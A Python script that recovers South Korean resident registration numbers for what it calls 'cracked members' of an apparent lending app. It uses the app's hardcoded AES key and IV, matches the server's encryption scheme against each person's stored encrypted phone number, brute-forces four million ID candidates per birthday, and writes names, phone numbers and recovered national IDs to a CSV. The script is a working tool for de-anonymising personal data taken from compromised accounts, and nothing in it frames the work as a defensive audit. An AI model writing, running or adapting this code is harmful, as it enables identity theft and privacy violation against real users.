#!/usr/bin/env python3
"""Offline RRN (resident-registration-number) recovery for cracked members.

Evidence: myinfo returns socialSecurityNumber as ONE 16-byte block (32 hex)
and mobile as one 16-byte block. The app's only known cipher is AES-256-CBC
(key okbigyo1okbigyo2okbigyo3okbigyo4, IV okbigyo1okbigyo2). If the server
hashes/encrypts RRN+mobile with the SAME key (ECB or CBC-fixed-IV), we can:

  1. CALIBRATE: encrypt "01040039341" under candidate schemes (ECB pkcs7,
     CBC iv=key[:16], CBC iv=b"IV", zero-pad, nopad-left/right) and compare
     to the stored mobileEnc. Whichever scheme reproduces it is THE scheme.
  2. BRUTE RRN: birthday is plaintext in myinfo (YYMMDD). Candidates =
     bdy + gender(1..4) + serial(000000..999999) = 4M. Encrypt each under
     the calibrated scheme, match the stored SSN hash. Threads, ~minutes.

Needs pycryptodome (installed by the workflow deps step). Outputs
cracked_profiles.csv (mobile,name,birthday,rrn,scheme,confidence).
"""
import base64
import csv
import itertools
import json
import os
import threading
import time

HERE = os.path.dirname(os.path.abspath(__file__))
KEY = b"okbigyo1okbigyo2okbigyo3okbigyo4"
IV = b"okbigyo1okbigyo2"
OUT_CSV = os.path.join(HERE, "cracked_profiles.csv")

try:
    from Crypto.Cipher import AES
except Exception:
    try:
        from Cryptodome.Cipher import AES
    except Exception as e:
        print(f"NoCryptoLib: {e}", flush=True)
        raise SystemExit(0)


def log(msg):
    print(f"[{time.strftime('%H:%M:%S')}] {msg}", flush=True)


def pads(s):
    b = s.encode()
    out = []
    pk = b + bytes([16 - len(b) % 16]) * (16 - len(b) % 16)
    out.append(("pkcs7", pk))
    zp = b.ljust(16, b"\x00")
    out.append(("zeropad-right", zp))
    zp2 = b"\x00" * (16 - len(b)) + b
    out.append(("zeropad-left", zp2))
    sp = b.ljust(16, b" ")
    out.append(("spacepad", sp))
    return out


def schemes_block(pt):
    """yield (scheme_name, ciphertext_hex) for one 16-byte block cipher family."""
    for pname, padded in pads(pt):
        yield f"aes-ecb-{pname}", AES.new(KEY, AES.MODE_ECB).encrypt(padded).hex()
        yield f"aes-cbc(iv=key16)-{pname}", AES.new(KEY, AES.MODE_CBC, KEY[:16]).encrypt(padded).hex()
        yield f"aes-cbc(iv=iv)-{pname}", AES.new(KEY, AES.MODE_CBC, IV).encrypt(padded).hex()


def calibrate(mobile_plain, mobile_enc_hex):
    target = mobile_enc_hex.lower()
    for name, hx in schemes_block(mobile_plain):
        if hx.lower() == target:
            return name
    return None


def bruteforce_rrn(bdy, target_hex, scheme):
    """bdy: 6-char YYMMDD. Returns (rrn, serial) or (None, None)."""
    target = target_hex.lower()
    found = {"rrn": None}
    lock = threading.Lock()

    def worker(gender, lo, hi):
        for serial in range(lo, hi):
            rrn = f"{bdy}{gender}{serial:06d}"
            for pname, padded in pads(rrn):
                if scheme.startswith("aes-ecb"):
                    hx = AES.new(KEY, AES.MODE_ECB).encrypt(padded).hex()
                elif "iv=key16" in scheme:
                    hx = AES.new(KEY, AES.MODE_CBC, KEY[:16]).encrypt(padded).hex()
                else:
                    hx = AES.new(KEY, AES.MODE_CBC, IV).encrypt(padded).hex()
                if hx.lower() == target:
                    with lock:
                        found["rrn"] = rrn
                    return
    threads = []
    CHUNK = 250000
    jobs = [(g, s, min(s + CHUNK, 1000000)) for g in "1234" for s in range(0, 1000000, CHUNK)]
    active = []
    qi = 0
    for _ in range(8):
        g, lo, hi = jobs[qi]; qi += 1
        t = threading.Thread(target=worker, args=(g, lo, hi))
        t.start(); active.append((t, g))
    while active and not found["rrn"]:
        for i, (t, _) in enumerate(active):
            if not t.is_alive():
                if found["rrn"]:
                    break
                if qi < len(jobs):
                    g, lo, hi = jobs[qi]; qi += 1
                    t = threading.Thread(target=worker, args=(g, lo, hi))
                    t.start()
                    active[i] = (t, g)
                else:
                    active.pop(i)
                    continue
        time.sleep(0.2)
    for t, _ in active:
        t.join(timeout=5)
    return found["rrn"]


FIELDS = ["mobile", "name", "birthday", "rrn", "scheme", "mobileEnc",
          "ssnHash", "confidence"]


def main():
    log("SSN_DECRYPT START")
    done = set()
    if os.path.exists(OUT_CSV):
        with open(OUT_CSV, newline="", encoding="utf-8") as f:
            for r in csv.DictReader(f):
                done.add(r.get("mobile", ""))
    csv_exists = os.path.exists(OUT_CSV)

    raw_dir = os.path.join(HERE, "loans_raw")
    for fn in sorted(os.listdir(raw_dir)) if os.path.isdir(raw_dir) else []:
        if not fn.endswith(".json"):
            continue
        mob = fn[:-5].replace("_", "-")
        if mob in done:
            continue
        try:
            d = json.load(open(os.path.join(raw_dir, fn)))
        except Exception:
            continue
        mi = (d.get("myinfo") or {}).get("data") or {}
        bdy = str(mi.get("birthday") or "")
        ssn = str(mi.get("socialSecurityNumber") or "").lower()
        men = str(mi.get("mobileEnc") or "").lower()
        name = mi.get("name") or ""
        if len(bdy) != 6 or len(ssn) != 32:
            log(f"{mob}: skip (bdy={bdy} ssn_len={len(ssn)})")
            continue
        scheme = calibrate(mi.get("mobile") or mob, men)
        log(f"{mob} {name} bdy={bdy} scheme={scheme or 'UNKNOWN'}")
        rec = {"mobile": mob, "name": name, "birthday": bdy,
               "mobileEnc": men, "ssnHash": ssn}
        if not scheme:
            rec.update({"rrn": "", "scheme": "UNCALIBRATED", "confidence": ""})
            with open(OUT_CSV, "a", newline="", encoding="utf-8") as f:
                w = csv.DictWriter(f, fieldnames=FIELDS)
                if not csv_exists:
                    w.writeheader()
                    csv_exists = True
                w.writerow(rec)
            continue
        log(f"{mob}: bruting 4M RRN candidates under {scheme} ...")
        t0 = time.time()
        rrn = bruteforce_rrn(bdy, ssn, scheme)
        dt = int(time.time() - t0)
        conf = "MATCH" if rrn else "EXHAUSTED_NO_MATCH"
        log(f"{mob}: rrn={rrn} in {dt}s ({conf})")
        rec.update({"rrn": rrn or "", "scheme": scheme, "confidence": conf})
        with open(OUT_CSV, "a", newline="", encoding="utf-8") as f:
            w = csv.DictWriter(f, fieldnames=FIELDS)
            if not csv_exists:
                w.writeheader()
                csv_exists = True
            w.writerow(rec)
    log("SSN_DECRYPT DONE")


if __name__ == "__main__":
    main()
